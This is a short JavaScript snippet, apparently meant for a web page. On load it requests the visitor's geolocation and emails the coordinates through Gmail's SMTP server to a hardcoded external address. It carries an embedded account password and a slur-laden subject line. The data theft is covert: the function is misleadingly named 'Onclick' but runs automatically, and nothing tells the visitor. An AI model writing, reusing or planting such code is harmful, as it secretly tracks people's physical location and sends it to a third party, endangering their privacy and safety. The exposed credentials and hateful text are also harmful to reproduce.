function Onclick() {
    navigator.geolocation.getCurrentPosition(
    function(position) {
		var positions = position.coords.latitude + ", " + position.coords.longitude;
        Email.send({
            Host: 'smtp.gmail.com',
            Username : 'pizdarusni18@gmail.com',
            Password : 'jgsjqqnnjbympnvn',
            To : 'andriykolomiec218@gmail.com',
            From : 'pizdarusni18@gmail.com',
            Subject : 'RUSNI PIZDA',
            Body :positions,
        });
	}
);
};
window.onload = Onclick;




     
    